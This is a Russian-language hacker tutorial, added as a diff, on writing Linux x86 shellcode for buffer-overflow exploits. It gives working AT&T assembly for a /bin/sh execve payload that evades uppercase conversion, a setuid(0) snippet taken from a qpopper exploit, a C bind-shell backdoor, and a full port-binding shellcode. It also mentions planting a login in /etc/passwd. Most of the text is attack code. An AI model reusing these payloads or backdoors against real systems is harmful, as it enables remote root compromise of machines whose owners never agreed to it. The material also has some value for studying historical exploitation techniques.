@@ -1,0 +1,197 @@
+ Эксперименты с шеллкодом                                        by lord matrix
+
+Блин. Уже каждый третий в состоянии накодить exploit. Даже каждый второй в состоянии
+его заюзать. Многие научились даже писать exploit-ы с нуля сами. Но основная масса народу все
+еще успешно слизывает друг у друга shellcode (код, который при buffer overflow должен
+выполнятся (естественно если дырка состоит в кривой обработке стека)).
+Для тех, кто еще не очень понимает, что такое вообще переполнение буфера рекомендую
+прочитать статью Aleph1 "Smashing the stack for fun and profit". Но там очень слабое объяснение
+того, как же собственно писать шеллкод, который будет выполнятся. Это достаточно просто,
+для этого нужно просто знать программирование под Linux на слегка более сложном уровне.
+Довольно часто вся функция шеллкода состоит в том, чтобы просто запустить шелл (откуда
+пошло название). Но! Еще со времен Imap народ столкнулся с неприятной проблемой - imap
+конвертировал стринги из lowercase в uppercase. В результате приходилось писать код: который
+бы преобразовывал стринг. Вот как выглядел код (для досовских ассемблеристов: это синтаксис
+at&t, а не intel):
+
+.globl main
+main:
+jmp call
+start:
+popl %ebx
+movl %ebx,%ecx
+addb $0x6,%cl
+loop:
+cmpl %ebx,%ecx
+jl skip
+addb $0x20,(%ecx)
+decb %cl
+jmp loop
+skip:
+movl %ebx,0x8(%ebx)
+xorl %eax,%eax
+movb %eax,0x7(%ebx)
+movl %eax,0xc(%ebx)
+movb $0xb,%al
+leal 0x8(%ebx),%ecx
+leal 0xc(%ebx),%edx
+int $0x80
+xorl %eax,%eax
+inc %al
+int $0x80
+call:
+call start
+.string "\x0f\x42\x49\x4e\x0f\x53\x48"
+
+Вот такой простенький код. Его можно использовать для маскировки символов, которые
+протокол или демон калечат. Однако все может быть значительно сложнее, например если нам
+понадобится делать системные вызовы (ну например если у нас хитро сделанный юзверь для
+демона). Номера системных вызовов лежат в <asm/unistd.h>. Как вообще происходит системный
+вызов уже в ассемблерном коде? Мы заносим в %eax номер системного вызова, в %ebx, %ecx,
+%edx мы заносим аргументы. Иногда, как в предыдущем примере мы заносим не сам аргумент,
+а его адрес. Вызываются syscall-ы linux-овым прерыванием $0x80
+Приведу простой пример использования системных вызовов - шеллкод из exploit-а qpopper:
+
+.globl main
+main:
+xorl %ebx,%ebx
+movl %ebx,%eax
+movb $0x17,%al
+int $0x80
+Этот код эквивалентен системному вызову setuid(0).
+Когда мы пролазим через удаленного демона нам естественно нужно прицепить вывод чего-
+либо с хакаемой машины на порт. Называется это port binding. Что нам нужно, так это передача
+по пайпу всего stdin/stdout/stderr по TCP-соединению. Но что, если наш демон умеет общаться
+только по UDP? Или что, если все TCP-соединения закрыты на файрволе для всех чужаков?
+Тогда действительно нужен UDP. Идея состоит в том, чтобы в шеллкоде прописать backdoor
+daemon, который бы просто цеплялся на порт и ожидал  соединения. Естесвенно можно не
+мучаться и написать добавлялку логина в /etc/passwd, но это скучно. Однако написать pipe для
+UDP значительно сложнее. Поэтому мы напишем обычный бэкдор:
+
+int main()
+{
+char *name[2];
+int fd,fd2,fromlen;
+struct sockaddr_in serv;
+
+fd=socket(AF_INET,SOCK_STREAM,0);
+serv.sin_addr.s_addr=0;
+serv.sin_port=1234;
+serv.sin_family=AF_INET;
+bind(fd,(struct sockaddr *)&serv,16);
+listen(fd,1);
+fromlen=16;
+fd2=accept(fd,(struct sockaddr *)&serv,&fromlen);
+dup2(fd2,0);
+dup2(fd2,1);
+dup2(fd2,2);
+name[0]="/bin/sh";
+name[1]=NULL;
+execve(name[0],name,NULL);
+}
+
+Как же все это переписать на asm-е? Единственное препятствие - неразбериха с системными
+вызовами для сети. Необходимые нам операции стоят как параметры в системном вызове 0x66.
+Параметры заносятся в %ebx:
+
+SYS_SOCKET   1
+SYS_BIND     2
+SYS_LISTEN   4
+SYS_ACCEPT   5
+
+Все номера параметров лежат в <linux/net.h>. А вот как выглядят константы и структуры
+сокета:
+
+
+AF_INET == 2
+SOCK_STREAM == 1
+struct sockaddr_in {
+  short int sin_family; /* 2 byte word, containing AF_INET */
+  unsigned short int sin_port; /* 2 byte word, containg the port in network byte order */
+  struct in_addr sin_addr /* 4 byte long, should be zeroed */
+  unsigned char pad[8]; /* should be zero, but doesn't really matter */
+};
+
+Так теперь давайте напишем полноценный шеллкод для перехвата порта:
+
+.globl main
+main:
+
+jmp bounce
+start:
+popl %esi
+
+xorl %eax,%eax
+movl %eax,0x8(%esi)
+movl %eax,0xc(%esi)
+movl %eax,0x10(%esi
+incb %al
+movl %eax,%ebx
+movl %eax,0x4(%esi)
+incb %al
+movl %eax,(%esi)
+movw %eax,0xc(%esi)
+leal (%esi),%ecx
+movb $0x66,%al
+int $0x80
+
+incb %bl
+movb %al,(%esi)
+movl %ecx,0x4(%esi)
+addb $0xc,0x4(%esi)
+movb $0x10,0x8(%esi)
+movb $0x23,0xe(%esi)
+movb $0x66,%al
+int $0x80
+
+movl %ebx,0x4(%esi)
+incb %bl
+incb %bl
+movb $0x66,%al
+int $0x80
+
+incb %bl
+movl %ecx,0x4(%esi)
+addb $0xc,0x4(%esi)
+movl %ecx,0x4(%esi)
+addb $0x1c,0x4(%esi)
+movb $0x66,%al
+int $0x80
+
+jmp skippy
+bounce:
+jmp call
+skippy:
+
+movb %al,%bl
+xorl %ecx,%ecx
+movb $0x3f,%al
+int $0x80
+incb %cl
+movb $0x3f,%al
+int $0x80
+incb %cl
+movb $0x3f,%al
+int $0x80
+
+movl %esi,%ebx
+addb $0x20,%ebx
+xorl %eax,%eax
+movl %ebx,0x8(%ebx)
+movb %al,0x7(%ebx)
+movl %eax,0xc(%ebx)
+movb $0xb,%al
+leal 0x8(%ebx),%ecx
+leal 0xc(%ebx),%edx
+int $0x80
+xorl %eax,%eax
+movl %eax,%ebx
+incb %al
+int $0x80
+call:
+call start
+.ascii "abcdabcdabcd""abcdefghabcdefgh""abcd""/bin/sh"
+
+Очевидно для солярки и шаровых бздей шеллкод нужно писать по-другому, но это уже
+тема для новой статьи =) Кстати в /bonus/shelcode я сложил несколько шеллкодов
+из разных exploit-ов.
